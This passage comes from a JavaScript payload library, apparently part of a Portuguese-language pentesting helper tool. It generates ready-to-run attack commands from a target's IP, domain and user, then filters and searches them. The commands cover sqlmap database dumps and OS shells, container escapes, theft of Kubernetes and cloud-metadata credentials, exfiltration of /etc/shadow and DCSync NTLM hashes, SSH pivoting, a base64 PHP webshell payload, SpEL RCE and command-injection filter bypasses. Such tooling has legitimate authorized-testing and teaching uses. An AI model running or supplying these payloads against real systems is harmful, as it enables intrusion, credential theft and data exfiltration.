      purpose: "Listar Service Principal Names (SPNs) vulner\u00e1veis a Kerberoast",
      description: "Identifica contas de servi\u00e7o que utilizam senhas fracas cracke\u00e1veis offline.",
      code: "setspn -T " + domain + " -Q \"*/*\"",
      showUrl: false,
      keywords: "cheat ad kerberoasting setspn spn service principal"
    },
    {
      id: "cheat-web-ffuf",
      title: "Web - Fuzzing de Diret\u00f3rios com ffuf",
      category: "cheats",
      categoryLabel: "Cheatsheets",
      icon: "\udb81\udea9",
      subcat: "web",
      context: "Web Discovery Cheatsheet",
      purpose: "Fuzzing de alta velocidade para descoberta de arquivos e rotas ocultas",
      description: "Substitui a palavra FUZZ pela wordlist recursivamente filtrando c\u00f3digos de erro.",
      code: "ffuf -u http://" + ip + ":" + port + "/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -mc 200,301,302,403",
      showUrl: false,
      keywords: "cheat web ffuf fuzzing directories discovery seclists"
    },
    {
      id: "cheat-web-sqlmap",
      title: "Web - Automa\u00e7\u00e3o SQLi com sqlmap",
      category: "cheats",
      categoryLabel: "Cheatsheets",
      icon: "\udb81\udea9",
      subcat: "web",
      context: "Web Vulnerability Testing",
      purpose: "Automatizar teste de inje\u00e7\u00e3o SQL e extra\u00e7\u00e3o de bancos de dados",
      description: "Testa par\u00e2metros do alvo e extrai a lista de schemas dispon\u00edveis.",
      code: "sqlmap -u \\\"http://" + ip + ":" + port + "/item?id=1\\\" --batch --dbs",
      showUrl: false,
      keywords: "cheat web sqlmap sqli automate dbs"
    },
    {
      id: "cheat-docker-escape",
      title: "Docker - Container Escape via Host Root Mount",
      category: "cheats",
      categoryLabel: "Cheatsheets",
      icon: "\udb81\udea9",
      subcat: "docker",
      context: "Docker Container Breakout",
      purpose: "Obter acesso root ao host montando a raiz / dentro do container",
      description: "Se o usu\u00e1rio atual pertencer ao grupo docker, executa um container montando o sistema de arquivos do host.",
      code: "docker run -v /:/mnt --rm -it alpine chroot /mnt /bin/bash",
      showUrl: false,
      keywords: "cheat docker container escape mount root host group"
    },
    {
      id: "cheat-docker-socket",
      title: "Docker - Checar Permiss\u00e3o no Socket Docker",
      category: "cheats",
      categoryLabel: "Cheatsheets",
      icon: "\udb81\udea9",
      subcat: "docker",
      context: "Docker Socket Security",
      purpose: "Verificar se o docker.sock est\u00e1 exposto para comunica\u00e7\u00e3o direta",
      description: "Permite controlar a daemon do Docker via curl ou docker CLI sem autentica\u00e7\u00e3o.",
      code: "ls -la /var/run/docker.sock; curl -s --unix-socket /var/run/docker.sock http://localhost/images/json",
      showUrl: false,
      keywords: "cheat docker socket unix docker.sock privesc"
    },
    {
      id: "cheat-k8s-secrets",
      title: "Kubernetes - Listar Secrets do Cluster",
      category: "cheats",
      categoryLabel: "Cheatsheets",
      icon: "\udb81\udea9",
      subcat: "kubernetes",
      context: "Kubernetes Security",
      purpose: "Extrair tokens de autentica\u00e7\u00e3o, senhas e certificados em todos os namespaces",
      description: "Coleta secrets em base64 armazenados no cluster Kubernetes.",
      code: "kubectl get secrets -A -o json",
      showUrl: false,
      keywords: "cheat kubernetes k8s secrets tokens credentials"
    },
    {
      id: "cheat-k8s-auth-can-i",
      title: "Kubernetes - Auditoria de Permiss\u00f5es RBAC",
      category: "cheats",
      categoryLabel: "Cheatsheets",
      icon: "\udb81\udea9",
      subcat: "kubernetes",
      context: "Kubernetes RBAC",
      purpose: "Listar todas as a\u00e7\u00f5es que a conta de servi\u00e7o atual tem permiss\u00e3o de executar",
      description: "Verifica se a ServiceAccount atual tem permiss\u00e3o para criar pods ou listar secrets.",
      code: "kubectl auth can-i --list",
      showUrl: false,
      keywords: "cheat kubernetes k8s rbac auth can-i permissions"
    },
    {
      id: "cheat-aws-sts",
      title: "AWS - Identidade Atual (sts get-caller-identity)",
      category: "cheats",
      categoryLabel: "Cheatsheets",
      icon: "\udb81\udea9",
      subcat: "aws",
      context: "AWS Cloud Security",
      purpose: "Identificar o usu\u00e1rio, ARN e conta AWS da credencial em uso",
      description: "Primeiro comando ap\u00f3s obter chaves AWS (AKIA / ASIA).",
      code: "aws sts get-caller-identity",
      showUrl: false,
      keywords: "cheat aws sts caller identity arn cloud"
    },
    {
      id: "cheat-aws-s3-ls",
      title: "AWS - Listar Buckets S3",
      category: "cheats",
      categoryLabel: "Cheatsheets",
      icon: "\udb81\udea9",
      subcat: "aws",
      context: "AWS Storage",
      purpose: "Verificar buckets S3 acess\u00edveis na conta",
      description: "Enumera armazenamento de arquivos onde frequentemente residem backups e credenciais.",
      code: "aws s3 ls",
      showUrl: false,
      keywords: "cheat aws s3 ls buckets storage files"
    },
    {
      id: "cheat-aws-metadata",
      title: "AWS - Metadados de Inst\u00e2ncia EC2 (IMDSv1)",
      category: "cheats",
      categoryLabel: "Cheatsheets",
      icon: "\udb81\udea9",
      subcat: "aws",
      context: "AWS SSRF / IMDS",
      purpose: "Extrair credenciais de IAM Role associada \u00e0 m\u00e1quina virtual",
      description: "Endere\u00e7o link-local do servi\u00e7o de metadados em inst\u00e2ncias EC2.",
      code: "curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/",
      showUrl: false,
      keywords: "cheat aws imds metadata ssrf ec2 credentials"
    },
    {
      id: "cheat-azure-account",
      title: "Azure - Conta Ativa (az account show)",
      category: "cheats",
      categoryLabel: "Cheatsheets",
      icon: "\udb81\udea9",
      subcat: "azure",
      context: "Azure Cloud Security",
      purpose: "Exibir a assinatura e locat\u00e1rio (Tenant) autenticados",
      description: "Verifica informa\u00e7\u00f5es da conta Azure conectada via Azure CLI.",
      code: "az account show -o table",
      showUrl: false,
      keywords: "cheat azure account show subscription tenant"
    },
    {
      id: "cheat-azure-metadata",
      title: "Azure - Metadados de Inst\u00e2ncia VM (IMDS)",
      category: "cheats",
      categoryLabel: "Cheatsheets",
      icon: "\udb81\udea9",
      subcat: "azure",
      context: "Azure SSRF / IMDS",
      purpose: "Consultar metadados e token de Managed Identity em VM Azure",
      description: "Requer o cabe\u00e7alho obrigat\u00f3rio Metadata: true para mitigar SSRF simples.",
      code: "curl -s -H \"Metadata:true\" \"http://169.254.169.254/metadata/instance?api-version=2021-02-01\"",
      showUrl: false,
      keywords: "cheat azure imds metadata instance vm ssrf"
    },
    {
      id: "linux-ssh-connect",
      title: "Linux - SSH Conexão com Chave Privada",
      category: "linux",
      categoryLabel: "Linux",
      icon: "󰌧",
      subcat: "ssh",
      context: "SSH Authentication",
      purpose: "Conectar ao alvo usando chave privada RSA/ED25519",
      description: "Ajusta as permissões da chave privada para 600 e conecta ignorando validação estrita de host.",
      code: "chmod 600 " + file + " && ssh -i " + file + " root@" + ip + " -o StrictHostKeyChecking=no",
      showUrl: false,
      keywords: "linux ssh connect private key chmod 600 id_rsa"
    },
    {
      id: "linux-ssh-authkeys",
      title: "Linux - Checar Authorized Keys",
      category: "linux",
      categoryLabel: "Linux",
      icon: "󰌧",
      subcat: "ssh",
      context: "SSH Persistence / Enumeration",
      purpose: "Inspecionar chaves públicas autorizadas para login",
      description: "Examina ~/.ssh/authorized_keys e outros arquivos de configuração para descobrir quem tem acesso SSH.",
      code: "cat ~/.ssh/authorized_keys 2>/dev/null; ls -la ~/.ssh/",
      showUrl: false,
      keywords: "linux ssh authorized_keys persistence enum"
    },
    {
      id: "linux-ssh-keygen",
      title: "Linux - Gerar Par de Chaves SSH",
      category: "linux",
      categoryLabel: "Linux",
      icon: "󰌧",
      subcat: "ssh",
      context: "SSH Key Generation",
      purpose: "Criar chave privada e pública sem senha para persistência",
      description: "Gera um par de chaves RSA de 2048 bits sem passphrase em /tmp/id_rsa.",
      code: "ssh-keygen -t rsa -b 2048 -f /tmp/id_rsa -q -N \"\"",
      showUrl: false,
      keywords: "linux ssh keygen generate rsa 2048"
    },
    {
      id: "linux-scp-download",
      title: "Linux - Download de Arquivo via SCP",
      category: "linux",
      categoryLabel: "Linux",
      icon: "󰌧",
      subcat: "scp",
      context: "SCP File Transfer",
      purpose: "Baixar arquivo sensível do host remoto via SSH",
      description: "Copia um arquivo da máquina remota para a pasta atual do atacante.",
      code: "scp -i " + file + " root@" + ip + ":/etc/shadow ./shadow.loot",
      showUrl: false,
      keywords: "linux scp download transfer file loot shadow"
    },
    {
      id: "linux-scp-upload",
      title: "Linux - Upload de Ferramenta via SCP",
      category: "linux",
      categoryLabel: "Linux",
      icon: "󰌧",
      subcat: "scp",
      context: "SCP File Transfer",
      purpose: "Transferir binário ou script para /tmp no host remoto",
      description: "Envia arquivo local (ex: linpeas.sh) para o diretório /tmp da vítima.",
      code: "scp -i " + file + " ./" + file + " root@" + ip + ":/tmp/" + file,
      showUrl: false,
      keywords: "linux scp upload transfer tool bin"
    },
    {
      id: "linux-scp-port",
      title: "Linux - SCP em Porta Customizada (-P)",
      category: "linux",
      categoryLabel: "Linux",
      icon: "󰌧",
      subcat: "scp",
      context: "SCP Custom Port",
      purpose: "Copiar arquivos quando o SSH roda em porta não padrão",
      description: "Usa o parâmetro -P maiúsculo para especificar a porta do daemon SSH.",
      code: "scp -P " + port + " -i " + file + " root@" + ip + ":/path/file ./",
      showUrl: false,
      keywords: "linux scp port custom transfer"
    },
    {
      id: "linux-proxy-socks",
      title: "Linux - SOCKS Proxy Dinâmico (SSH -D)",
      category: "linux",
      categoryLabel: "Linux",
      icon: "󰌧",
      subcat: "proxy",
      context: "Pivoting & SOCKS",
      purpose: "Abrir túnel SOCKS5 local na porta 1080 via SSH",
      description: "Permite usar proxychains ou o navegador para navegar por toda a rede interna do alvo.",
      code: "ssh -D 1080 -N -f -q user@" + ip,
      showUrl: false,
      keywords: "linux proxy socks dynamic ssh 1080 tunnel"
    },
    {
      id: "linux-proxy-sshuttle",
      title: "Linux - VPN Transparente (sshuttle)",
      category: "linux",
      categoryLabel: "Linux",
      icon: "󰌧",
      subcat: "proxy",
      context: "Pivoting & VPN",
      purpose: "Roteamento transparente da subnet interna sem instalar binários no alvo",
      description: "Cria uma VPN sobre SSH encaminhando todo o tráfego da rede \" + pivnet + \".",
      code: "sshuttle -r user@" + ip + " " + pivnet,
      showUrl: false,
      keywords: "linux proxy sshuttle vpn transparent subnet pivot"
    },
    {
      id: "linux-proxy-proxychains",
      title: "Linux - Executar Comando com Proxychains",
      category: "linux",
      categoryLabel: "Linux",
      icon: "󰌧",
      subcat: "proxy",
      context: "Proxychains Tunneling",
      purpose: "Tunelar varredura ou exploração através do proxy SOCKS",
      description: "Roda comandos TCP através do túnel configurado em /etc/proxychains4.conf.",
      code: "proxychains4 nmap -sT -Pn -p 80,445,3389 " + pivhost,
      showUrl: false,
      keywords: "linux proxy proxychains nmap scan pivot socks"
    },
    {
      id: "sqli-sqlmap-banner",
      title: "sqlmap - Detecção e Banner do DBMS",
      category: "sqli",
      categoryLabel: "SQLi",
      icon: "󰆼",
      subcat: "sqlmap",
      context: "Automated SQLi (sqlmap)",
      purpose: "Testar parâmetro vulnerável e extrair banner do banco",
      description: "Executa sqlmap em modo não interativo (--batch) contra o alvo.",
      code: "sqlmap -u \\\"http://" + ip + ":" + port + "/?id=1\\\" --batch --banner",
      showUrl: false,
      keywords: "sqli sqlmap automated banner test detect"
    },
    {
      id: "sqli-sqlmap-dbs",
      title: "sqlmap - Listar Todos os Bancos de Dados",
      category: "sqli",
      categoryLabel: "SQLi",
      icon: "󰆼",
      subcat: "sqlmap",
      context: "Automated SQLi (sqlmap)",
      purpose: "Enumerar esquemas e bancos existentes",
      description: "Coleta a lista completa de bases de dados acessíveis.",
      code: "sqlmap -u \\\"http://" + ip + ":" + port + "/?id=1\\\" --batch --dbs",
      showUrl: false,
      keywords: "sqli sqlmap dbs enum databases"
    },
    {
      id: "sqli-sqlmap-tables",
      title: "sqlmap - Listar Tabelas de um Banco",
      category: "sqli",
      categoryLabel: "SQLi",
      icon: "󰆼",
      subcat: "sqlmap",
      context: "Automated SQLi (sqlmap)",
      purpose: "Listar tabelas de uma base específica",
      description: "Filtra pelo banco especificado e extrai todas as tabelas.",
      code: "sqlmap -u \\\"http://" + ip + ":" + port + "/?id=1\\\" --batch -D dbname --tables",
      showUrl: false,
      keywords: "sqli sqlmap tables enum database"
    },
    {
      id: "sqli-sqlmap-dump",
      title: "sqlmap - Dump de Tabela de Usuários",
      category: "sqli",
      categoryLabel: "SQLi",
      icon: "󰆼",
      subcat: "sqlmap",
      context: "Automated SQLi (sqlmap)",
      purpose: "Baixar registros e quebrar hashes de senha de uma tabela",
      description: "Despeja todo o conteúdo da tabela users incluindo hashes de senha.",
      code: "sqlmap -u \\\"http://" + ip + ":" + port + "/?id=1\\\" --batch -D dbname -T users --dump",
      showUrl: false,
      keywords: "sqli sqlmap dump users passwords hashes"
    },
    {
      id: "sqli-sqlmap-osshell",
      title: "sqlmap - OS Shell Interativo (--os-shell)",
      category: "sqli",
      categoryLabel: "SQLi",
      icon: "󰆼",
      subcat: "sqlmap",
      context: "Automated SQLi to RCE",
      purpose: "Fazer upload de backdoor SQL para obter shell do sistema operacional",
      description: "Utiliza injeção para subir um stager de comando no servidor web ou banco.",
      code: "sqlmap -r req.txt --batch --os-shell",
      showUrl: false,
      keywords: "sqli sqlmap os-shell rce command upload"
    },
    {
      id: "cheat-win-unquoted",
      title: "Windows - Unquoted Service Paths",
      category: "cheats",
      categoryLabel: "Cheatsheets",
      icon: "󰚩",
      subcat: "windows",
      context: "Windows Privilege Escalation",
      purpose: "Localizar serviços com caminhos não entre aspas que permitam binário falso",
      description: "Procura serviços configurados como Auto que não usam aspas em caminhos com espaços.",
      code: "wmic service get name,displayname,pathname,startmode | findstr /i \"auto\" | findstr /i /v \"c:\\\\windows\\\\\" | findstr /i /v \"\"\"",
      showUrl: false,
      keywords: "cheat windows unquoted service paths privesc"
    },
    {
      id: "cheat-win-always-elevated",
      title: "Windows - AlwaysInstallElevated Check",
      category: "cheats",
      categoryLabel: "Cheatsheets",
      icon: "󰚩",
      subcat: "windows",
      context: "Windows Privilege Escalation",
      purpose: "Verificar se instaladores MSI rodam como NT AUTHORITY\\SYSTEM",
      description: "Se ambas as chaves de registro forem 0x1, um pacote .msi malicioso garante root/SYSTEM.",
      code: "reg query HKCU\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows\\\\Installer /v AlwaysInstallElevated; reg query HKLM\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows\\\\Installer /v AlwaysInstallElevated",
      showUrl: false,
      keywords: "cheat windows alwaysinstallelevated registry msi privesc"
    },
    {
      id: "cheat-ad-bloodhound",
      title: "Active Directory - Coleta Rápida BloodHound",
      category: "cheats",
      categoryLabel: "Cheatsheets",
      icon: "󰚩",
      subcat: "ad",
      context: "Active Directory Graph Analysis",
      purpose: "Coletar todo o grafo de permissões, sessões e ACLs do domínio",
      description: "Gera arquivo ZIP para importação direta na interface do BloodHound.",
      code: "bloodhound-python -d " + domain + " -u " + user + " -p \x27PASS\x27 -gc " + dc + " -c All --zip",
      showUrl: false,
      keywords: "cheat ad bloodhound graph acl sessions domain"
    },
    {
      id: "cheat-ad-secretsdump",
      title: "Active Directory - Dump de NTLM Hashes (DCSync)",
      category: "cheats",
      categoryLabel: "Cheatsheets",
      icon: "󰚩",
      subcat: "ad",
      context: "Active Directory Credential Dumping",
      purpose: "Extrair hashes NTLM de todos os usuários do domínio via protocolo DRSR",
      description: "Requer privilégios de DCSync (membro de Domain Admins ou direitos de replicação).",
      code: "impacket-secretsdump -just-dc-ntlm " + domain + "/" + user + "@" + dc,
      showUrl: false,
      keywords: "cheat ad secretsdump dcsync hashes ntlm"
    },
    {
      id: "cheat-web-feroxbuster",
      title: "Web - Fuzzing de Rotas com Feroxbuster",
      category: "cheats",
      categoryLabel: "Cheatsheets",
      icon: "󰚩",
      subcat: "web",
      context: "Web Discovery",
      purpose: "Descoberta rápida e recursiva de diretórios em Rust",
      description: "Ferramenta de alta concorrência com auto-tune de requisições.",
      code: "feroxbuster -u http://" + ip + ":" + port + " -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 30",
      showUrl: false,
      keywords: "cheat web feroxbuster directories wordlist discovery"
    },
    {
      id: "cheat-web-api-enum",
      title: "Web - Enumeração de Endpoints de API",
      category: "cheats",
      categoryLabel: "Cheatsheets",
      icon: "󰚩",
      subcat: "web",
      context: "REST API Discovery",
      purpose: "Identificar rotas RESTful e endpoints GraphQL",
      description: "Fuzzing focado em endpoints comuns de APIs modernas.",
      code: "ffuf -u http://" + ip + ":" + port + "/api/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common-api-endpoints.txt -mc 200,201,401,403",
      showUrl: false,
      keywords: "cheat web api endpoints graphql rest ffuf"
    },
    {
      id: "cheat-docker-priv-cgroup",
      title: "Docker - Escape via Privileged Cgroup v1",
      category: "cheats",
      categoryLabel: "Cheatsheets",
      icon: "󰚩",
      subcat: "docker",
      context: "Container Breakout",
      purpose: "Executar comando no host a partir de container privileged",
      description: "Utiliza a feature release_agent do cgroup para disparar script no host pai.",
      code: "mkdir -p /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x",
      showUrl: false,
      keywords: "cheat docker privileged cgroup escape breakout"
    },
    {
      id: "cheat-k8s-token",
      title: "Kubernetes - Leitura de Token de ServiceAccount",
      category: "cheats",
      categoryLabel: "Cheatsheets",
      icon: "󰚩",
      subcat: "kubernetes",
      context: "Kubernetes Token Extraction",
      purpose: "Extrair o token JWT montado dentro do pod",
      description: "Lê o token que permite autenticação contra a API do Kubernetes.",
      code: "cat /var/run/secrets/kubernetes.io/serviceaccount/token",
      showUrl: false,
      keywords: "cheat kubernetes token serviceaccount jwt pod"
    },
    {
      id: "cheat-aws-s3-sync",
      title: "AWS - Download Completo de Bucket S3",
      category: "cheats",
      categoryLabel: "Cheatsheets",
      icon: "󰚩",
      subcat: "aws",
      context: "AWS Cloud Storage",
      purpose: "Sincronizar e baixar todos os arquivos de um bucket S3",
      description: "Copia recursivamente arquivos do bucket para diretório local.",
      code: "aws s3 sync s3://target-bucket ./s3_loot/",
      showUrl: false,
      keywords: "cheat aws s3 sync bucket download files"
    },
    {
      id: "cheat-azure-group",
      title: "Azure - Listar Resource Groups",
      category: "cheats",
      categoryLabel: "Cheatsheets",
      icon: "󰚩",
      subcat: "azure",
      context: "Azure Cloud Enumeration",
      purpose: "Mapear grupos de recursos e regiões onde a organização opera",
      description: "Lista todos os resource groups da assinatura ativa.",
      code: "az group list -o table",
      showUrl: false,
      keywords: "cheat azure resource groups enum table"
    },
    {
      id: "web-hdr-cors",
      title: "Web - Teste de CORS Origin Reflection",
      category: "web",
      categoryLabel: "Web",
      icon: "󰖟",
      subcat: "headers",
      context: "CORS Misconfiguration",
      purpose: "Verificar se a aplicação reflete cabeçalho Origin arbitrário",
      description: "Se Access-Control-Allow-Origin refletir evil.com com Allow-Credentials: true, há roubo de dados.",
      code: "curl -H \"Origin: https://evil.com\" -I -s http://" + ip + ":" + port + "/",
      showUrl: false,
      keywords: "web headers cors origin reflection credentials"
    },
    {
      id: "web-hdr-cookie-flags",
      title: "Web - Auditoria de Flags em Set-Cookie",
      category: "web",
      categoryLabel: "Web",
      icon: "󰖟",
      subcat: "headers",
      context: "Session Security",
      purpose: "Verificar presença de flags HttpOnly, Secure e SameSite nos cookies",
      description: "Cookies sem HttpOnly podem ser lidos via XSS; sem Secure podem vazar em HTTP puro.",
      code: "curl -I -s http://" + ip + ":" + port + "/ | grep -i \"Set-Cookie\"",
      showUrl: false,
      keywords: "web headers cookies httponly secure samesite flags"
    },
    {
      id: "web-ssti-spel",
      title: "Web - SSTI Spring Expression Language (SpEL)",
      category: "web",
      categoryLabel: "Web",
      icon: "󰖟",
      subcat: "ssti",
      context: "Java Spring Boot SSTI",
      purpose: "Executar comandos do sistema operacional em aplicações Spring",
      description: "Avalia expressões SpEL invocando Runtime.getRuntime().exec() para RCE.",
      code: "${T(java.lang.Runtime).getRuntime().exec('id')}",
      showUrl: true,
      keywords: "web ssti spel java spring boot runtime exec"
    },
    {
      id: "web-rfi-data",
      title: "Web - RFI via PHP Data Wrapper",
      category: "web",
      categoryLabel: "Web",
      icon: "󰖟",
      subcat: "rfi",
      context: "PHP Stream Wrappers",
      purpose: "Injetar código PHP inline em base64 sem hospedar servidor remoto",
      description: "Usa o wrapper data:// para passar payload <?php system($_GET['c']); ?> diretamente na URL.",
      code: "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg==",
      showUrl: true,
      keywords: "web rfi data wrapper php base64 inline rce"
    },
    {
      id: "web-traversal-nginx",
      title: "Web - Path Traversal (Nginx Off-by-Slash)",
      category: "web",
      categoryLabel: "Web",
      icon: "󰖟",
      subcat: "traversal",
      context: "Nginx Alias Misconfiguration",
      purpose: "Retroceder pasta raiz de alias em servidores Nginx configurados sem barra final",
      description: "Explora configuração 'location /static { alias /var/www/static/; }' permitindo ler /static../app.py.",
      code: "/static../settings.py",
      showUrl: true,
      keywords: "web traversal nginx off by slash alias"
    },
    {
      id: "web-traversal-win",
      title: "Web - Path Traversal (Windows Hosts)",
      category: "web",
      categoryLabel: "Web",
      icon: "󰖟",
      subcat: "traversal",
      context: "Windows File Traversal",
      purpose: "Ler o arquivo de hosts do Windows para confirmar a vulnerabilidade",
      description: "Usa contra-barras duplas para navegar até C:\\Windows\\System32\\drivers\\etc\\hosts.",
      code: "..\\\\..\\\\..\\\\..\\\\windows\\\\system32\\\\drivers\\\\etc\\\\hosts",
      showUrl: true,
      keywords: "web traversal windows hosts drivers etc path"
    },
    {
      id: "web-cmdi-ifs",
      title: "Web - Command Injection (Bypass de Espaço ${IFS})",
      category: "web",
      categoryLabel: "Web",
      icon: "󰖟",
      subcat: "cmdi",
      context: "WAF / Filter Bypass",
      purpose: "Executar comandos quando a aplicação bloqueia espaços ou quebras de linha",
      description: "Usa a variável interna do shell IFS (Internal Field Separator) como substituto de espaço.",
      code: "cat\\${IFS}/etc/passwd",
      showUrl: true,
      keywords: "web cmdi bypass ifs space filter waf"
    },
    {
      id: "web-cmdi-b64-pipe",
      title: "Web - Command Injection (Base64 Pipe Decode)",
      category: "web",
      categoryLabel: "Web",
      icon: "󰖟",
      subcat: "cmdi",
      context: "WAF Bypass / Obfuscation",
      purpose: "Executar comandos arbitrários ofuscados para escapar de filtros de caracteres especiais",
      description: "Decodifica string base64 em runtime e passa direto para o shell sh.",
      code: "echo\\${IFS}Y2F0IC9ldGMvcGFzc3dk|base64\\${IFS}-d|sh",
      showUrl: true,
      keywords: "web cmdi base64 pipe decode bypass waf sh"
    }
  ];
}

function getLinuxPayloads(subcat, ip, port, file, domain, user, dc, pivnet, pivhost) {
  var all = getAllPayloads(ip, port, file, domain, user, dc, pivnet, pivhost);
  return all.filter(function(item) {
    if (item.category !== "linux") return false;
    if (!subcat || subcat === "all") return true;
    if (subcat === "ssh") return item.subcat === "ssh" || item.subcat === "ssh_scp";
    if (subcat === "scp") return item.subcat === "scp" || item.subcat === "ssh_scp";
    if (subcat === "capabilities" || subcat === "cap") return item.subcat === "capabilities" || item.subcat === "cap";
    return item.subcat === subcat;
  });
}

function getSqliPayloads(subcat, ip, port, file, domain, user, dc, pivnet, pivhost) {
  var all = getAllPayloads(ip, port, file, domain, user, dc, pivnet, pivhost);
  return all.filter(function(item) {
    if (item.category !== "sqli") return false;
    if (!subcat || subcat === "all") return true;
    return item.subcat === subcat;
  });
}

function getWebPayloads(subcat, ip, port, file, domain, user, dc, pivnet, pivhost) {
  var all = getAllPayloads(ip, port, file, domain, user, dc, pivnet, pivhost);
  return all.filter(function(item) {
    if (item.category !== "web" && item.category !== "xss" && item.category !== "lfi") return false;
    if (!subcat || subcat === "all") return true;
    if (subcat === "xss") return item.category === "xss" || item.subcat === "xss";
    if (subcat === "lfi") return item.category === "lfi" || item.subcat === "lfi";
    if (subcat === "traversal") return item.subcat === "traversal";
    return item.subcat === subcat;
  });
}

function getCheatsheets(subcat, ip, port, file, domain, user, dc, pivnet, pivhost) {
  var all = getAllPayloads(ip, port, file, domain, user, dc, pivnet, pivhost);
  return all.filter(function(item) {
    if (item.category !== "cheats") return false;
    if (!subcat || subcat === "all") return true;
    return item.subcat === subcat;
  });
}

function getFavorites(favList, ip, port, file, domain, user, dc, pivnet, pivhost) {
  if (!favList || !favList.length) return [];
  var all = getAllPayloads(ip, port, file, domain, user, dc, pivnet, pivhost);
  return all.filter(function(item) {
    return favList.indexOf(String(item.code)) >= 0;
  });
}

function searchPayloads(query, ip, port, file, domain, user, dc, pivnet, pivhost) {
  var q = String(query || "").trim().toLowerCase();
  if (!q) return [];
  var terms = q.split(/\s+/);
  var all = getAllPayloads(ip, port, file, domain, user, dc, pivnet, pivhost);
  return all.filter(function(item) {
    var haystack = (item.title + " " + item.category + " " + item.categoryLabel + " " + item.subcat + " " + item.context + " " + item.purpose + " " + item.description + " " + item.keywords).toLowerCase();
    for (var i = 0; i < terms.length; i++) {
      if (haystack.indexOf(terms[i]) === -1) return false;
    }
    return true;
  });
}
